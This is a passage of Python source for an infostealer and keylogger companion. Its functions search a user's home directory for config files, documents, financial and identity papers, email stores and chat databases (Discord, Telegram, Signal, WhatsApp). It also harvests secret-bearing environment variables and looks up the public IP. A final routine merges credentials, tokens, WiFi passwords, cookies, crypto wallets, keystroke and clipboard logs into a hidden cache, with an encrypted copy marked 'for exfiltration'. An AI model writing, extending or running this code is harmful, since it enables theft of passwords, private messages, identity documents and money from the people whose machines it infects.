            for file in files:
                if len(config_files) >= max_files:
                    break
                
                file_path = os.path.join(root, file)
                
                # Check if file matches our criteria
                should_collect = False
                
                # Check extension
                if file.endswith(config_extensions):
                    should_collect = True
                
                # Check if filename contains sensitive keywords
                if not should_collect:
                    file_lower = file.lower()
                    if any(keyword in file_lower for keyword in sensitive_keywords):
                        should_collect = True
                
                if should_collect:
                    try:
                        file_stat = os.stat(file_path)
                        
                        # Skip if too large
                        if file_stat.st_size > max_file_size:
                            continue
                        
                        # Try to read file content
                        file_content = None
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                file_content = f.read()
                        except:
                            # If text read fails, try binary
                            try:
                                with open(file_path, 'rb') as f:
                                    file_content = f.read().decode('utf-8', errors='ignore')
                            except:
                                pass
                        
                        # Only add if we got content or it's a small file
                        if file_content or file_stat.st_size < 10240:  # < 10KB
                            config_files.append({
                                'path': file_path,
                                'size': file_stat.st_size,
                                'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                                'content': file_content[:10000] if file_content else None,  # Limit content to 10KB
                                'relative_path': file_path.replace(config_dir + '/', '')
                            })
                    except (OSError, PermissionError):
                        pass
            
            if len(config_files) >= max_files:
                break
    except Exception as e:
        log_activity("ERROR", f"Error collecting config files: {e}")
    
    if config_files:
        log_activity("CONFIG_FILES", f"Found {len(config_files)} config files from ~/.config/")
    
    return config_files

def collect_recent_documents():
    """Collect all documents (Excel, PDF, Word, PowerPoint, etc.)"""
    documents = []
    home_dir = os.path.expanduser("~")
    seen_files = set()
    
    # All document file extensions
    document_extensions = (
        # Office documents
        '.doc', '.docx', '.docm', '.dot', '.dotx',  # Word
        '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlt', '.xltx', '.csv',  # Excel
        '.ppt', '.pptx', '.pptm', '.pot', '.potx', '.pps', '.ppsx',  # PowerPoint
        '.odt', '.ods', '.odp', '.odg', '.odf',  # OpenDocument
        # PDF and text
        '.pdf', '.txt', '.rtf', '.tex', '.md', '.markdown',
        # Archives (may contain documents)
        '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
        # Images (may contain text/diagrams)
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg',
        # Other
        '.pages', '.numbers', '.key',  # Apple iWork
        '.wps', '.wpt', '.et', '.dps',  # WPS Office
        '.one',  # OneNote
    )
    
    # Document keywords in filenames
    doc_keywords = [
        'document', 'doc', 'report', 'presentation', 'spreadsheet',
        'invoice', 'contract', 'agreement', 'proposal', 'resume', 'cv',
        'financial', 'budget', 'statement', 'receipt', 'tax',
        'project', 'plan', 'meeting', 'notes', 'memo',
        'confidential', 'private', 'secret', 'personal'
    ]
    
    # Search locations (expanded)
    search_locations = [
        f"{home_dir}/Documents",
        f"{home_dir}/Downloads",
        f"{home_dir}/Desktop",
        f"{home_dir}/Pictures",
        f"{home_dir}/Videos",
        f"{home_dir}/Music",
        f"{home_dir}/.local/share",
        f"{home_dir}/.config",
        # Common project directories
        f"{home_dir}/Projects",
        f"{home_dir}/projects",
        f"{home_dir}/Work",
        f"{home_dir}/work",
        # Backup locations
        f"{home_dir}/backup",
        f"{home_dir}/Backup",
        f"{home_dir}/backups",
        f"{home_dir}/Backups",
    ]
    
    max_size = 50 * 1024 * 1024  # 50MB max per file
    max_depth = 5  # Maximum directory depth
    max_files = 500  # Increased limit for more documents
    
    for search_path in search_locations:
        if len(documents) >= max_files:
            break
            
        if not os.path.exists(search_path):
            continue
        
        try:
            # Determine max depth based on location
            if search_path in [f"{home_dir}/Documents", f"{home_dir}/Downloads", f"{home_dir}/Desktop"]:
                current_max_depth = 4
            else:
                current_max_depth = max_depth
            
            for root, dirs, files in os.walk(search_path):
                # Calculate depth
                if root != search_path:
                    depth = root[len(search_path):].count(os.sep)
                    if depth > current_max_depth:
                        dirs[:] = []  # Don't recurse deeper
                        continue
                
                # Skip certain directories
                dirs[:] = [d for d in dirs if d not in {'.git', '.svn', 'node_modules', '__pycache__', '.cache', 'venv', '.venv'}]
                
                for file in files:
                    if len(documents) >= max_files:
                        break
                    
                    file_lower = file.lower()
                    file_path = os.path.join(root, file)
                    
                    # Skip if already seen
                    if file_path in seen_files:
                        continue
                    
                    # Check by extension
                    matches_extension = file_lower.endswith(document_extensions)
                    
                    # Check by filename keywords
                    matches_keyword = any(keyword in file_lower for keyword in doc_keywords)
                    
                    if matches_extension or matches_keyword:
                        try:
                            file_stat = os.stat(file_path)
                            
                            # Skip if too large
                            if file_stat.st_size > max_size:
                                continue
                            
                            # Skip if too small (likely not a document)
                            if file_stat.st_size < 10:  # Less than 10 bytes
                                continue
                            
                            seen_files.add(file_path)
                            
                            # Try to extract text content for text-based files
                            content_preview = None
                            if file_lower.endswith(('.txt', '.md', '.markdown', '.rtf', '.csv', '.log')):
                                try:
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        content_preview = content[:2000]  # First 2000 chars
                                except:
                                    try:
                                        with open(file_path, 'r', encoding='latin-1', errors='ignore') as f:
                                            content = f.read()
                                            content_preview = content[:2000]
                                    except:
                                        pass
                            
                            # Determine document type
                            doc_type = 'unknown'
                            if file_lower.endswith(('.doc', '.docx', '.docm', '.odt', '.rtf', '.txt', '.md')):
                                doc_type = 'text_document'
                            elif file_lower.endswith(('.xls', '.xlsx', '.xlsm', '.csv', '.ods')):
                                doc_type = 'spreadsheet'
                            elif file_lower.endswith(('.ppt', '.pptx', '.pptm', '.odp')):
                                doc_type = 'presentation'
                            elif file_lower.endswith('.pdf'):
                                doc_type = 'pdf'
                            elif file_lower.endswith(('.zip', '.rar', '.7z', '.tar', '.gz')):
                                doc_type = 'archive'
                            elif file_lower.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg')):
                                doc_type = 'image'
                            else:
                                doc_type = 'other'
                            
                            documents.append({
                                'path': file_path,
                                'filename': file,
                                'type': doc_type,
                                'extension': os.path.splitext(file)[1] or 'no_extension',
                                'size': file_stat.st_size,
                                'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                                'created': datetime.datetime.fromtimestamp(file_stat.st_ctime).isoformat() if hasattr(file_stat, 'st_ctime') else None,
                                'content_preview': content_preview,
                                'relative_path': file_path.replace(home_dir + '/', '')
                            })
                            
                        except (OSError, PermissionError) as e:
                            pass
                        except Exception as e:
                            log_activity("ERROR", f"Error processing document {file_path}: {e}")
                            
        except Exception as e:
            log_activity("ERROR", f"Error searching documents in {search_path}: {e}")
            continue
    
    if documents:
        log_activity("DOCUMENTS", f"Found {len(documents)} documents (Excel, PDF, Word, etc.)")
    else:
        log_activity("DOCUMENTS", "No documents found")
    
    return documents

def collect_system_info_comprehensive():
    """Collect comprehensive system information"""
    system_info = {}
    
    try:
        system_info['hostname'] = os.uname().nodename if hasattr(os, 'uname') else 'unknown'
        system_info['user'] = os.getenv('USER', 'unknown')
        system_info['home'] = os.path.expanduser("~")
        
        env_vars = {}
        sensitive_env = ['API_KEY', 'SECRET', 'PASSWORD', 'TOKEN', 'KEY', 'CREDENTIAL']
        for key, value in os.environ.items():
            if any(s in key.upper() for s in sensitive_env):
                env_vars[key] = value[:100] if len(value) < 100 else value[:50] + "..."
        system_info['environment_variables'] = env_vars
        
        if PSUTIL_AVAILABLE:
            try:
                interfaces = psutil.net_if_addrs()
                system_info['network_interfaces'] = {k: [str(addr) for addr in v] for k, v in interfaces.items()}
            except:
                pass
        
        try:
            result = subprocess.run(['dpkg', '-l'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=5)
            if result.returncode == 0:
                packages = result.stdout.decode().split('\n')[:50]
                system_info['installed_packages'] = packages
        except:
            try:
                result = subprocess.run(['pacman', '-Q'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=5)
                if result.returncode == 0:
                    packages = result.stdout.decode().split('\n')[:50]
                    system_info['installed_packages'] = packages
            except:
                pass
        
        try:
            with open('/proc/uptime', 'r') as f:
                uptime_seconds = float(f.read().split()[0])
                system_info['uptime_seconds'] = uptime_seconds
        except:
            pass
    except:
        pass
    
    # Get public IP address
    try:
        import urllib.request
        public_ip = urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode('utf-8')
        system_info['public_ip'] = public_ip
    except:
        try:
            public_ip = urllib.request.urlopen('https://ifconfig.me', timeout=5).read().decode('utf-8').strip()
            system_info['public_ip'] = public_ip
        except:
            system_info['public_ip'] = 'unknown'
    
    log_activity("SYSTEM_INFO", "Comprehensive system information collected")
    return system_info

def collect_financial_data():
    """Collect financial information from documents and form data"""
    financial_data = []
    home_dir = os.path.expanduser("~")
    
    # Keywords to search for in documents
    financial_keywords = [
        'bank', 'account', 'card', 'credit', 'debit', 'cvv', 'cvc',
        'routing', 'swift', 'iban', 'account number', 'card number',
        'balance', 'transaction', 'payment', 'invoice', 'receipt',
        'tax', 'salary', 'income', 'expense', 'budget', 'financial'
    ]
    
    # Search in documents
    doc_locations = [
        f"{home_dir}/Documents",
        f"{home_dir}/Downloads",
        f"{home_dir}/Desktop",
    ]
    
    for doc_dir in doc_locations:
        if not os.path.exists(doc_dir):
            continue
        
        try:
            for root, dirs, files in os.walk(doc_dir):
                for file in files:
                    file_lower = file.lower()
                    # Check if filename contains financial keywords
                    if any(keyword in file_lower for keyword in financial_keywords):
                        file_path = os.path.join(root, file)
                        try:
                            file_stat = os.stat(file_path)
                            if file_stat.st_size < 10 * 1024 * 1024:  # < 10MB
                                financial_data.append({
                                    'type': 'document',
                                    'path': file_path,
                                    'filename': file,
                                    'size': file_stat.st_size,
                                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                                    'reason': 'filename_contains_financial_keywords'
                                })
                        except:
                            pass
        except:
            pass
    
    if financial_data:
        log_activity("FINANCIAL", f"Found {len(financial_data)} potential financial documents")
    
    return financial_data

def collect_identity_documents():
    """Collect identity documents (CMND/CCCD, passport, medical records)"""
    identity_docs = []
    home_dir = os.path.expanduser("~")
    
    # Keywords for identity documents
    identity_keywords = [
        'cmnd', 'cccd', 'passport', 'id card', 'identity',
        'medical', 'health', 'insurance', 'baohiem',
        'birth certificate', 'driver license', 'bằng lái',
        'visa', 'citizenship', 'quốc tịch'
    ]
    
    # File extensions that might contain identity documents
    identity_extensions = ('.pdf', '.jpg', '.jpeg', '.png', '.doc', '.docx')
    
    # Search locations
    search_locations = [
        f"{home_dir}/Documents",
        f"{home_dir}/Downloads",
        f"{home_dir}/Desktop",
        f"{home_dir}/Pictures",
    ]
    
    for search_path in search_locations:
        if not os.path.exists(search_path):
            continue
        
        try:
            for root, dirs, files in os.walk(search_path):
                for file in files:
                    file_lower = file.lower()
                    file_path = os.path.join(root, file)
                    
                    # Check by filename keywords
                    matches_keyword = any(keyword in file_lower for keyword in identity_keywords)
                    
                    # Check by extension
                    matches_extension = file_lower.endswith(identity_extensions)
                    
                    if matches_keyword or matches_extension:
                        try:
                            file_stat = os.stat(file_path)
                            if file_stat.st_size < 50 * 1024 * 1024:  # < 50MB
                                identity_docs.append({
                                    'type': 'identity_document',
                                    'path': file_path,
                                    'filename': file,
                                    'size': file_stat.st_size,
                                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                                    'detected_by': 'keyword' if matches_keyword else 'extension'
                                })
                        except:
                            pass
        except:
            pass
    
    if identity_docs:
        log_activity("IDENTITY", f"Found {len(identity_docs)} potential identity documents")
    
    return identity_docs

def collect_email_contacts_and_content():
    """Collect email contacts and content"""
    email_data = {
        'contacts': [],
        'content': []
    }
    home_dir = os.path.expanduser("~")
    
    # Email client locations
    email_locations = [
        f"{home_dir}/.thunderbird",
        f"{home_dir}/.local/share/evolution",
        f"{home_dir}/.config/evolution",
        f"{home_dir}/.local/share/mail",
        f"{home_dir}/Mail",
        f"{home_dir}/.mail",
    ]
    
    for email_path in email_locations:
        if not os.path.exists(email_path):
            continue
        
        try:
            for root, dirs, files in os.walk(email_path):
                # Look for address books and contacts
                for file in files:
                    file_lower = file.lower()
                    file_path = os.path.join(root, file)
                    
                    if any(keyword in file_lower for keyword in ['addressbook', 'contacts', 'abook', '.mab', '.ldif']):
                        try:
                            file_stat = os.stat(file_path)
                            if file_stat.st_size < 10 * 1024 * 1024:  # < 10MB
                                email_data['contacts'].append({
                                    'type': 'addressbook',
                                    'path': file_path,
                                    'size': file_stat.st_size,
                                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat()
                                })
                        except:
                            pass
                    
                    # Look for email content (mbox, eml files)
                    if file_lower.endswith(('.mbox', '.eml', '.msg')):
                        try:
                            file_stat = os.stat(file_path)
                            if file_stat.st_size < 5 * 1024 * 1024:  # < 5MB
                                email_data['content'].append({
                                    'type': 'email_message',
                                    'path': file_path,
                                    'size': file_stat.st_size,
                                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat()
                                })
                        except:
                            pass
        except:
            pass
    
    if email_data['contacts'] or email_data['content']:
        log_activity("EMAIL", f"Found {len(email_data['contacts'])} contact files, {len(email_data['content'])} email messages")
    
    return email_data

def collect_chat_messages():
    """Collect chat messages from messaging apps"""
    chat_data = []
    home_dir = os.path.expanduser("~")
    
    # Chat application locations
    chat_locations = {
        'discord': [
            f"{home_dir}/.config/discord",
            f"{home_dir}/.config/Discord",
        ],
        'telegram': [
            f"{home_dir}/.local/share/TelegramDesktop",
            f"{home_dir}/.config/TelegramDesktop",
        ],
        'slack': [
            f"{home_dir}/.config/Slack",
        ],
        'signal': [
            f"{home_dir}/.config/Signal",
        ],
        'whatsapp': [
            f"{home_dir}/.config/whatsapp",
            f"{home_dir}/.local/share/whatsapp",
        ],
    }
    
    # Database extensions that might contain chat messages
    chat_db_extensions = ('.db', '.sqlite', '.sqlite3', '.ldb')
    
    for app_name, paths in chat_locations.items():
        for chat_path in paths:
            if not os.path.exists(chat_path):
                continue
            
            try:
                for root, dirs, files in os.walk(chat_path):
                    for file in files:
                        file_lower = file.lower()
                        file_path = os.path.join(root, file)
                        
                        # Look for database files that might contain messages
                        if file_lower.endswith(chat_db_extensions):
                            # Check if filename suggests it contains messages
                            if any(keyword in file_lower for keyword in ['message', 'chat', 'conversation', 'history', 'index']):
                                try:
                                    file_stat = os.stat(file_path)
                                    if file_stat.st_size < 100 * 1024 * 1024:  # < 100MB
                                        chat_data.append({
                                            'app': app_name,
                                            'type': 'chat_database',
                                            'path': file_path,
                                            'filename': file,
                                            'size': file_stat.st_size,
                                            'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat()
                                        })
                                except:
                                    pass
            except:
                pass
    
    if chat_data:
        log_activity("CHAT", f"Found {len(chat_data)} chat message databases")
    
    return chat_data

def normalize_and_deduplicate_data(all_data):
    """Normalize and deduplicate collected data, merge common data"""
    normalized = {
        'timestamp': all_data.get('timestamp'),
        'hostname': all_data.get('hostname'),
        'user': all_data.get('user'),
    }
    
    # 1. Unified Credentials: Merge passwords and password_manager_files
    unified_credentials = []
    seen_cred_keys = set()
    
    # Add browser passwords
    for pwd in all_data.get('passwords', []):
        file_path = pwd.get('file', '')
        if file_path:
            key = hashlib.md5(file_path.encode()).hexdigest()
            if key not in seen_cred_keys:
                seen_cred_keys.add(key)
                unified_credentials.append({
                    'type': 'browser_password',
                    'source': pwd.get('browser', 'unknown'),
                    'file_path': file_path,
                    'size': pwd.get('size', 0),
                    'modified': pwd.get('modified'),
                    'hash': pwd.get('hash'),
                    'file_type': pwd.get('type', 'unknown')
                })
    
    # Add password manager files
    for pm_file in all_data.get('password_manager_files', []):
        file_path = pm_file.get('path', '') or pm_file.get('file', '')
        if file_path:
            key = hashlib.md5(file_path.encode()).hexdigest()
            if key not in seen_cred_keys:
                seen_cred_keys.add(key)
                unified_credentials.append({
                    'type': 'password_manager',
                    'source': pm_file.get('manager', 'unknown'),
                    'file_path': file_path,
                    'size': pm_file.get('size', 0),
                    'modified': pm_file.get('modified'),
                    'hash': pm_file.get('hash'),
                    'file_type': pm_file.get('type', pm_file.get('extension', 'unknown')),
                    'filename': pm_file.get('filename', os.path.basename(file_path))
                })
    
    normalized['unified_credentials'] = unified_credentials
    
    # 2. Unified Files: Merge sensitive_files and config_files (deduplicate by path)
    unified_files = []
    seen_file_paths = set()
    
    for file_item in all_data.get('sensitive_files', []):
        file_path = file_item.get('path', '')
        if file_path and file_path not in seen_file_paths:
            seen_file_paths.add(file_path)
            unified_files.append({
                'path': file_path,
                'category': 'sensitive',
                'size': file_item.get('size', 0),
                'modified': file_item.get('modified'),
                'hash': file_item.get('hash'),
                'content_preview': file_item.get('content', '')[:500] if file_item.get('content') else None
            })
    
    for file_item in all_data.get('config_files', []):
        file_path = file_item.get('path', '')
        if file_path and file_path not in seen_file_paths:
            seen_file_paths.add(file_path)
            unified_files.append({
                'path': file_path,
                'category': 'config',
                'size': file_item.get('size', 0),
                'modified': file_item.get('modified'),
                'hash': None,  # config_files don't have hash
                'content_preview': file_item.get('content', '')[:500] if file_item.get('content') else None,
                'relative_path': file_item.get('relative_path')
            })
    
    normalized['unified_files'] = unified_files
    
    # 3. Unified Tokens: Merge application_tokens and development_tokens (deduplicate by value)
    unified_tokens = []
    seen_token_values = set()
    
    for token in all_data.get('application_tokens', []):
        token_value = token.get('token', '') or token.get('value', '')
        if token_value:
            token_key = hashlib.md5(token_value.encode()).hexdigest()
            if token_key not in seen_token_values:
                seen_token_values.add(token_key)
                unified_tokens.append({
                    'type': 'application',
                    'service': token.get('service', token.get('application', 'unknown')),
                    'token': token_value[:100],  # Limit token length
                    'location': token.get('file', token.get('path', 'unknown')),
                    'source': 'application'
                })
    
    for token in all_data.get('development_tokens', []):
        token_value = token.get('token', '') or token.get('value', '')
        if token_value:
            token_key = hashlib.md5(token_value.encode()).hexdigest()
            if token_key not in seen_token_values:
                seen_token_values.add(token_key)
                unified_tokens.append({
                    'type': 'development',
                    'service': token.get('service', token.get('tool', 'unknown')),
                    'token': token_value[:100],
                    'location': token.get('file', token.get('path', 'unknown')),
                    'source': 'development'
                })
    
    normalized['unified_tokens'] = unified_tokens
    
    # 4. WiFi Passwords: Deduplicate by SSID (already done in collect_wifi_passwords, but ensure)
    wifi_passwords = []
    seen_ssids = set()
    for wifi in all_data.get('wifi_passwords', []):
        ssid = wifi.get('ssid', '').lower()
        if ssid and ssid not in seen_ssids:
            seen_ssids.add(ssid)
            wifi_passwords.append({
                'ssid': wifi.get('ssid'),
                'password': wifi.get('password'),
                'method': wifi.get('method', 'unknown'),
                'connection_name': wifi.get('connection_name'),
                'source_file': wifi.get('source_file')
            })
    
    normalized['wifi_passwords'] = wifi_passwords
    
    # 5. Browser Data: Keep as is (already structured)
    normalized['browser_data'] = all_data.get('browser_data', {})
    
    # 6. Email Configs: Deduplicate by email/account
    email_configs = []
    seen_emails = set()
    for email in all_data.get('email_configs', []):
        email_key = email.get('email', '') or email.get('account', '')
        if email_key:
            email_lower = email_key.lower()
            if email_lower not in seen_emails:
                seen_emails.add(email_lower)
                email_configs.append({
                    'email': email_key,
                    'client': email.get('client', email.get('application', 'unknown')),
                    'config_file': email.get('file', email.get('path', 'unknown')),
                    'server': email.get('server', email.get('imap_server', email.get('smtp_server', 'unknown')))
                })
    
    normalized['email_configs'] = email_configs
    
    # 7. Databases: Deduplicate by path
    databases = []
    seen_db_paths = set()
    for db in all_data.get('databases', []):
        db_path = db.get('path', '')
        if db_path and db_path not in seen_db_paths:
            seen_db_paths.add(db_path)
            databases.append({
                'path': db_path,
                'type': db.get('type', 'unknown'),
                'size': db.get('size', 0),
                'modified': db.get('modified'),
                'hash': db.get('hash')
            })
    
    normalized['databases'] = databases
    
    # 8. Cloud Storage Configs: Deduplicate by service and path
    cloud_configs = []
    seen_cloud_keys = set()
    for cloud in all_data.get('cloud_storage_configs', []):
        service = cloud.get('service', 'unknown')
        path = cloud.get('path', cloud.get('file', ''))
        key = f"{service}:{path}"
        if key not in seen_cloud_keys:
            seen_cloud_keys.add(key)
            cloud_configs.append({
                'service': service,
                'path': path,
                'config_file': path
            })
    
    normalized['cloud_storage_configs'] = cloud_configs
    
    # 9. High-value data (keep as is, no deduplication needed)
    normalized['crypto_wallets'] = all_data.get('crypto_wallets', [])
    normalized['recent_documents'] = all_data.get('recent_documents', [])
    normalized['system_info'] = all_data.get('system_info', {})
    normalized['financial_data'] = all_data.get('financial_data', [])
    normalized['identity_documents'] = all_data.get('identity_documents', [])
    normalized['email_contacts_content'] = all_data.get('email_contacts_content', {})
    normalized['chat_messages'] = all_data.get('chat_messages', [])
    
    # Statistics
    normalized['statistics'] = {
        'unified_credentials': len(unified_credentials),
        'unified_files': len(unified_files),
        'unified_tokens': len(unified_tokens),
        'wifi_passwords': len(wifi_passwords),
        'email_configs': len(email_configs),
        'databases': len(databases),
        'cloud_storage_configs': len(cloud_configs),
        'browser_cookies': len(normalized['browser_data'].get('cookies', [])),
        'browser_history': len(normalized['browser_data'].get('history', [])),
        'crypto_wallets': len(normalized['crypto_wallets']),
        'recent_documents': len(normalized['recent_documents']),
        'financial_data': len(normalized['financial_data']),
        'identity_documents': len(normalized['identity_documents']),
        'email_contacts': len(normalized['email_contacts_content'].get('contacts', [])),
        'email_messages': len(normalized['email_contacts_content'].get('content', [])),
        'chat_messages': len(normalized['chat_messages']),
    }
    
    return normalized

def save_all_collected_data():
    """Collect and save ALL important data to .system_cache"""
    log_activity("DATA_COLLECTION", "Starting comprehensive data collection...")
    
    all_data = {
        'timestamp': datetime.datetime.now().isoformat(),
        'hostname': os.uname().nodename if hasattr(os, 'uname') else 'unknown',
        'user': os.getenv('USER', 'unknown'),
    }
    
    # Collect all data types
    all_data['passwords'] = collect_passwords()
    all_data['sensitive_files'] = collect_sensitive_files()
    all_data['browser_data'] = collect_browser_data()
    all_data['wifi_passwords'] = collect_wifi_passwords()
    all_data['email_configs'] = collect_email_configs()
    all_data['databases'] = collect_database_files()
    all_data['crypto_wallets'] = collect_crypto_wallets()
    all_data['recent_documents'] = collect_recent_documents()
    all_data['system_info'] = collect_system_info_comprehensive()
    
    # Enhanced data collection
    all_data['application_tokens'] = collect_application_tokens()
    all_data['cloud_storage_configs'] = collect_cloud_storage_configs()
    all_data['development_tokens'] = collect_development_tokens()
    all_data['password_manager_files'] = collect_password_manager_files()
    all_data['config_files'] = collect_all_config_files()
    
    # High-value data collection
    all_data['financial_data'] = collect_financial_data()
    all_data['identity_documents'] = collect_identity_documents()
    all_data['email_contacts_content'] = collect_email_contacts_and_content()
    all_data['chat_messages'] = collect_chat_messages()
    
    # Include keyboard logs (FULL content, no truncation)
    log_file = f"{DATA_DIR}/{LOG_FILE}"
    all_data['keyboard_logs'] = ""
    all_data['activity_logs'] = ""  # Keep for compatibility
    if os.path.exists(log_file):
        try:
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                all_data['keyboard_logs'] = content
                all_data['activity_logs'] = content  # Same content
                all_data['keyboard_logs_size'] = len(content)
                all_data['keyboard_logs_lines'] = content.count('\n')
                log_activity("DATA_COLLECTION", f"Included keyboard logs: {len(content)} chars, {content.count(chr(10))} lines")
        except Exception as e:
            log_activity("DATA_COLLECTION", f"Error reading keyboard logs: {e}")
    
    # Include clipboard history if available
    clipboard_file = f"{DATA_DIR}/clipboard_history.txt"
    if os.path.exists(clipboard_file):
        try:
            with open(clipboard_file, 'r', encoding='utf-8', errors='ignore') as f:
                clipboard_content = f.read()
                all_data['clipboard_history'] = clipboard_content.split('\n') if clipboard_content else []
                all_data['clipboard_history_size'] = len(clipboard_content)
        except:
            pass
    
    # Normalize and deduplicate data
    normalized_data = normalize_and_deduplicate_data(all_data)
    
    # Add keyboard logs and clipboard to normalized data (not deduplicated, keep full content)
    normalized_data['keyboard_logs'] = all_data.get('keyboard_logs', '')
    normalized_data['activity_logs'] = all_data.get('activity_logs', '')
    normalized_data['keyboard_logs_size'] = all_data.get('keyboard_logs_size', 0)
    normalized_data['keyboard_logs_lines'] = all_data.get('keyboard_logs_lines', 0)
    normalized_data['clipboard_history'] = all_data.get('clipboard_history', [])
    normalized_data['clipboard_history_size'] = all_data.get('clipboard_history_size', 0)
    
    # Save to .system_cache - ONLY normalized_data.json (clean, deduplicated, accurate)
    try:
        os.makedirs(DATA_DIR, exist_ok=True)
        
        # Save normalized data (ONLY FILE - clean, deduplicated, ready to use)
        data_file = f"{DATA_DIR}/normalized_data.json"
        with open(data_file, 'w', encoding='utf-8') as f:
            json.dump(normalized_data, f, indent=2, default=str, ensure_ascii=False)
        
        # Also save encrypted version (optional, for exfiltration)
        try:
            encrypted_data = encrypt_data(json.dumps(normalized_data, default=str))
            with open(ENCRYPTED_DATA_FILE, 'w', encoding='utf-8') as f:
                f.write(encrypted_data)
        except:
            pass  # Encryption is optional
        
        # Summary with both raw and normalized statistics
        stats = normalized_data.get('statistics', {})
        summary = {
            'collection_time': all_data['timestamp'],
            'raw_data': {
                'passwords': len(all_data['passwords']),
                'sensitive_files': len(all_data['sensitive_files']),
                'config_files': len(all_data.get('config_files', [])),
                'browser_cookies': len(all_data['browser_data']['cookies']),
                'browser_history': len(all_data['browser_data']['history']),
                'wifi_configs': len(all_data['wifi_passwords']),
                'email_configs': len(all_data['email_configs']),
                'databases': len(all_data['databases']),
                'crypto_wallets': len(all_data['crypto_wallets']),
                'recent_documents': len(all_data['recent_documents']),
                'application_tokens': len(all_data.get('application_tokens', [])),
                'cloud_storage_configs': len(all_data.get('cloud_storage_configs', [])),
                'development_tokens': len(all_data.get('development_tokens', [])),
                'password_manager_files': len(all_data.get('password_manager_files', [])),
            },
            'normalized_data': stats,
            'deduplication': {
                'credentials_merged': len(all_data['passwords']) + len(all_data.get('password_manager_files', [])) - stats.get('unified_credentials', 0),
                'files_merged': len(all_data['sensitive_files']) + len(all_data.get('config_files', [])) - stats.get('unified_files', 0),
                'tokens_merged': len(all_data.get('application_tokens', [])) + len(all_data.get('development_tokens', [])) - stats.get('unified_tokens', 0),
            }
        }
        
        summary_file = f"{DATA_DIR}/data_summary.json"
        with open(summary_file, 'w', encoding='utf-8') as f:
            json.dump(summary, f, indent=2)
        
        log_activity("DATA_COLLECTION", f"Data collection complete. Saved to {DATA_DIR}/")
        log_activity("DATA_COLLECTION", f"Data saved: {data_file}")
        log_activity("DATA_COLLECTION", f"Summary: {json.dumps(summary, default=str)}")
        
        # Print summary to console (clear text)
        print("\n" + "="*70)
        print("DATA EXPLOITATION COMPLETE - NORMALIZED & DEDUPLICATED")
        print("="*70)
        print("\n📊 NORMALIZED DATA (Deduplicated & Merged):")
        print(f"  🔐 Unified Credentials: {stats.get('unified_credentials', 0)} (merged from passwords + password managers)")
        print(f"  📁 Unified Files: {stats.get('unified_files', 0)} (merged from sensitive + config files)")
        print(f"  🔑 Unified Tokens: {stats.get('unified_tokens', 0)} (merged from application + development tokens)")
        print(f"  📶 WiFi Passwords: {stats.get('wifi_passwords', 0)}")
        print(f"  📧 Email Configs: {stats.get('email_configs', 0)}")
        print(f"  💾 Databases: {stats.get('databases', 0)}")
        print(f"  ☁️  Cloud Storage: {stats.get('cloud_storage_configs', 0)}")
        print(f"  🍪 Browser Cookies: {stats.get('browser_cookies', 0)}")
        print(f"  📜 Browser History: {stats.get('browser_history', 0)}")
        print(f"  💰 Crypto Wallets: {stats.get('crypto_wallets', 0)}")
        print(f"  📄 Recent Documents: {stats.get('recent_documents', 0)}")
        print(f"  💳 Financial Data: {stats.get('financial_data', 0)}")
        print(f"  🆔 Identity Documents: {stats.get('identity_documents', 0)}")
        print(f"  📧 Email Contacts: {stats.get('email_contacts', 0)}")
        print(f"  📨 Email Messages: {stats.get('email_messages', 0)}")
        print(f"  💬 Chat Messages: {stats.get('chat_messages', 0)}")
        
        print("\n📈 DEDUPLICATION STATS:")
        dedup = summary['deduplication']
        print(f"  Credentials: Removed {dedup['credentials_merged']} duplicates")
        print(f"  Files: Removed {dedup['files_merged']} duplicates")
        print(f"  Tokens: Removed {dedup['tokens_merged']} duplicates")
        
        print(f"\n💾 File saved:")
        print(f"  Data: {data_file} (normalized, deduplicated, accurate)")
        print("="*70 + "\n")
        
        return all_data
    except Exception as e:
        log_activity("ERROR", f"Failed to save collected data: {e}")
        return None

